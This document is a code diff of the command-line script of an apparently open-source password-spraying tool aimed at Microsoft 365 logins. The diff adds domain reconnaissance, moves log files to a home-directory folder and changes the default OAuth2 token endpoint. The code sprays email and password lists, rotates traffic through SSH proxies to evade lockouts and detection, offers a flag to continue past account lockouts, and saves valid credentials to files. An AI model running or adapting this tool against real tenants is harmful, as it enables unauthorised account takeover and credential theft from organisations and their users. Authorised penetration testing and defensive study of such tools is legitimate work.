@@ -11,6 +11,7 @@ from lib import logger
 from time import sleep
 from lib.proxy import *
 from lib.errors import *
+from lib.discover import *
 from shutil import which
 from getpass import getpass
 from lib.msol import MSOLSpray
@@ -18,63 +19,77 @@ from lib.msol import MSOLSpray
 
 log = logging.getLogger('trevorspray.cli')
 
+trevorspray_dir = Path.home() / '.trevorspray'
+trevorspray_dir.mkdir(exist_ok=True)
+
 
 def main(options):
 
-    valid_emails_file = str(Path(__file__).absolute().parent / 'log' / 'valid_emails.txt')
-    tried_logins_file = str(Path(__file__).absolute().parent / 'log' / 'tried_logins.txt')
-    valid_logins_file = str(Path(__file__).absolute().parent / 'log' / 'valid_logins.txt')
+    if options.recon:
+        for domain in options.recon:
+            discovery = DomainDiscovery(domain)
+            discovery.recon()
+            consider = 'You can also try:\n'
+            for suggestion in discovery.suggest():
+                consider += f' - {suggestion}\n'
+            log.info(consider)
 
-    load_balancer = SSHLoadBalancer(
-        hosts=options.ssh,
-        key=options.key,
-        key_pass=options.key_pass,
-        base_port=options.base_port,
-        current_ip=(not options.no_current_ip)
-    )
+    if (options.passwords and options.emails):
 
-    for password in options.passwords:
+        valid_emails_file = str(trevorspray_dir / 'valid_emails.txt')
+        tried_logins_file = str(trevorspray_dir / 'tried_logins.txt')
+        valid_logins_file = str(trevorspray_dir / 'valid_logins.txt')
 
-        sprayer = MSOLSpray(
-            emails=options.emails,
-            password=password,
-            url=options.url,
-            force=options.force,
-            load_balancer=load_balancer,
-            verbose=options.verbose,
-            skip_logins=util.read_file(tried_logins_file)
+        load_balancer = SSHLoadBalancer(
+            hosts=options.ssh,
+            key=options.key,
+            key_pass=options.key_pass,
+            base_port=options.base_port,
+            current_ip=(not options.no_current_ip)
         )
 
-        try:
+        for password in options.passwords:
 
-            load_balancer.start()
+            sprayer = MSOLSpray(
+                emails=options.emails,
+                password=password,
+                url=options.url,
+                force=options.force,
+                load_balancer=load_balancer,
+                verbose=options.verbose,
+                skip_logins=util.read_file(tried_logins_file)
+            )
 
-            for proxy in load_balancer.proxies:
-                log.debug(f'Proxy: {proxy}')
+            try:
 
-            log.info(f'Spraying {len(options.emails):,} users against {options.url} at {time.ctime()}')
-            log.info(f'Command: {" ".join(sys.argv)}')
+                load_balancer.start()
 
-            for i,result in enumerate(sprayer.spray()):
-                print(f'       Sprayed {i+1:,} accounts\r', end='', flush=True)
-                if options.verbose and options.delay > 0:
-                    log.debug(f'Sleeping for {options.delay:,} seconds')
-                sleep(options.delay)
+                for proxy in load_balancer.proxies:
+                    log.debug(f'Proxy: {proxy}')
 
-            log.info(f'Finished spraying {len(options.emails):,} users against {options.url} at {time.ctime()}')
-            for success in sprayer.valid_logins:
-                log.critical(success)
+                log.info(f'Spraying {len(options.emails):,} users against {options.url} at {time.ctime()}')
+                log.info(f'Command: {" ".join(sys.argv)}')
 
-        finally:
-            load_balancer.stop()
-            # write valid emails
-            util.update_file(valid_emails_file, sprayer.valid_emails)
-            log.debug(f'{len(sprayer.valid_emails):,} valid emails written to {valid_emails_file}')
-            # write attempted logins
-            util.update_file(tried_logins_file, sprayer.tried_logins)
-            # write valid logins
-            util.update_file(valid_logins_file, sprayer.valid_logins)
-            log.debug(f'{len(sprayer.valid_logins):,} valid user/pass combos written to {valid_logins_file}')
+                for i,result in enumerate(sprayer.spray()):
+                    print(f'       Sprayed {i+1:,} accounts\r', end='', flush=True)
+                    if options.verbose and options.delay > 0:
+                        log.debug(f'Sleeping for {options.delay:,} seconds')
+                    sleep(options.delay)
+
+                log.info(f'Finished spraying {len(options.emails):,} users against {options.url} at {time.ctime()}')
+                for success in sprayer.valid_logins:
+                    log.critical(success)
+
+            finally:
+                load_balancer.stop()
+                # write valid emails
+                util.update_file(valid_emails_file, sprayer.valid_emails)
+                log.debug(f'{len(sprayer.valid_emails):,} valid emails written to {valid_emails_file}')
+                # write attempted logins
+                util.update_file(tried_logins_file, sprayer.tried_logins)
+                # write valid logins
+                util.update_file(valid_logins_file, sprayer.valid_logins)
+                log.debug(f'{len(sprayer.valid_logins):,} valid user/pass combos written to {valid_logins_file}')
 
 
 
@@ -83,11 +98,12 @@ if __name__ == '__main__':
 
     parser = argparse.ArgumentParser(description='Execute password sprays against O365, optionally proxying the traffic through SSH hosts')
 
-    parser.add_argument('-e', '--emails', nargs='+', required=True, help='Emails(s) and/or file(s) filled with emails')
-    parser.add_argument('-p', '--passwords', nargs='+', required=True, help='Password(s) that will be used to perform the password spray')
+    parser.add_argument('-e', '--emails', nargs='+', help='Emails(s) and/or file(s) filled with emails')
+    parser.add_argument('-p', '--passwords', nargs='+', help='Password(s) that will be used to perform the password spray')
+    parser.add_argument('-r', '--recon', metavar='DOMAIN(S)', nargs='+', help='Pulls lots of information related to authentication, email, Azure, Microsoft Online, etc.')
     parser.add_argument('-f', '--force', action='store_true', help='Forces the spray to continue and not stop when multiple account lockouts are detected')
     parser.add_argument('-d', '--delay', type=float, default=0, help='Sleep for this many seconds between requests')
-    parser.add_argument('-u', '--url', default='https://login.microsoft.com', help='The URL to spray against (default is https://login.microsoft.com)')
+    parser.add_argument('-u', '--url', default='https://login.microsoft.com/common/oauth2/token', help='The URL to spray against (default is https://login.microsoft.com)')
     parser.add_argument('-v', '--verbose', action='store_true', help='Show which proxy is being used for each request')
     parser.add_argument('-s', '--ssh', default=[], nargs='+', help='Round-robin load-balance through these SSH hosts (user@host) NOTE: Current IP address is also used once per round')
     parser.add_argument('-k', '--key', help='Use this SSH key when connecting to proxy hosts')
@@ -98,6 +114,13 @@ if __name__ == '__main__':
     try:
 
         options = parser.parse_args()
+
+        if not (options.emails and options.passwords):
+            if not options.recon:
+                log.error('Please specify --emails and --passwords')
+        else:
+            options.emails = util.files_to_list(options.emails)
+
 
         if options.no_current_ip and not options.ssh:
             log.error('Cannot specify --no-current-ip without giving --ssh hosts')
@@ -111,9 +134,6 @@ if __name__ == '__main__':
 
         if options.ssh and util.ssh_key_encrypted(options.key):
             options.key_pass = getpass('SSH key password (press enter if none): ')
-
-        # handle emails
-        options.emails = util.files_to_list(options.emails)
 
         main(options)
 
